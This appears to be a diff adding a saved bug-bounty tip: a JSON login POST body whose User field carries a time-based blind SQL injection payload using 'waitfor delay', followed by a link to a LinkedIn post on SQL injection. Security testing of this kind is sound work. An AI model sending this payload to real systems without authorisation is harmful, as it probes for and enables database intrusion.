@@ -1,0 +1,11 @@
+POST Request
+
+{
+"User":"abcdefg'; waitfor delay '0:0:8' -- ",
+"Pwd":"Abc@123"
+}
+
+
+
+
+https://www.linkedin.com/posts/ibrahim-h-101430102_bugbounty-sqlinjection-bugbountytips-activity-7049382128878272512-ieJS
